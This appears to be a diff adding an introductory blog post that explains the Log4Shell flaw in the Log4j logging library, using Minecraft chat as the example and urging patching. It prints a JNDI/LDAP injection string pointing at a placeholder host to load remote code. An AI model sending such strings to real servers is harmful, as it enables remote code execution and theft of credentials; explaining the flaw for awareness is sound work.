@@ -1,0 +1,82 @@
+import styles from './document.module.css'
+
+
+<div>
+
+## Introduction
+
+If you're into cybersecurity even a little bit, you probably have heard about
+the recent, groundbreaking exploit: **Log4Shell**. The threat is considered
+catastrophic by the cybersecurity community because of the vast number of devices that use the library.
+Before we understand the exploit and why we should be worried, let's first understand 
+the **Log4j** library. 
+
+*I suggest reading the overview if you continue to the technical 
+explanation.*
+
+## Overview
+
+**Log4j** is a tool to help developers monitor and debug software in order
+to ensure everything runs smoothly. It logs a ton of information and the main
+purpose is to store the information somewhere like a server. The purpose of this
+library should be to *just* store information, but what if we can trick the server
+ to execute code?
+
+The vulnerability within Log4j is known as **Log4shell**. To better understand this vulnerability, let's discuss how it was discovered. Minecraft
+uses Log4j for debugging and essentially logs the events as the 
+application is running. If the game were to crash, Log4j would be able to see 
+when and what process may have caused it. It can also keep track of the messages sent by
+the players which is logged to the server (see where the vulnerability can be?).
+
+An injection attack is a type of attack where the attacker inputs a message followed by
+a command that injects a malicious program into the server.
+By utilizing an injection attack which is just tricking the server to execute code from the
+attacker, malicious code can be executed on the server which can grant the attacker
+unauthorized access and more. The attacker can have access to sensitive information on the server
+as well as even admin privileges to do as they please.
+
+
+## How It Works
+Now for the more in-depth discussion. **Log4j** is a popular monitoring framework written in Java and is used to log 
+data. I think the non-technical explanation pretty much covers it, so I'll jump right 
+into the vulnerability.
+
+Going back to the Minecraft example, Log4j works with the Java Naming and
+Directory Interface (JNDI) API which allows developers to connect their programs with
+external directories. Lightweight Directory Access Protocol (LDAP) is the tool used to essentially connect
+everything which is used by JNDI. 
+
+The following command can be pasted into the chat to perform the injection:
+`${jndi:ldap://ip_address/malicious_code()`. That's really it. A command sent through the
+chat can allow attackers to execute any code on the host's server.
+
+Over the past few weeks, hosts of popular Minecraft servers have been hacked through this exploit. Sensitive information
+and credentials were hijacked because it was possible to use this attack on the client. Although simple, this attack
+demonstrates why companies and software that use Log4j have been causing an uproar.
+
+Be sure to check the references for the video that demonstrates
+the attack. John Hammond also does a really in-depth video with the exploit on both Minecraft and a TryHackMe Lab 
+which are both at the bottom as well.
+
+## What Now?
+
+The patch is out, but Log4j is used by a *ton* of companies around the world which is 
+why this exploit is so critical. It's up to the teams in charge of the
+technology to update the version in order to avoid falling victim to this attack. It 
+was fortunate that such a vulnerability was discovered because an exploit like this
+is surely to be maliciously used by organizations and governments.
+
+As a matter of fact, the Chinese government actually dicisplined a group 
+for not reporting Log4shell to them first. The cybersecurity engineer to report the flaw
+was suspended of work for six months. As always, be sure to check the references for the full
+report.
+
+
+## References
+
+* <a href="https://www.youtube.com/watch?v=aJteDOavUFk"> Minecraft Log4Shell Exploit </a>
+* <a href="https://tryhackme.com/room/solar"> John Hammond's TryHackMe Lab </a>
+* <a href="https://www.youtube.com/watch?v=7qoPDq41xhQ"> John Hammond's Minecraft Video </a>
+* <a href="https://www.scmp.com/tech/big-tech/article/3160670/apache-Log4j-bug-chinas-industry-ministry-pulls-support-alibaba-cloud"> Apache Log4j bug: China’s industry ministry pulls support from Alibaba Cloud for not reporting flaw to government first  </a>
+
+</div>
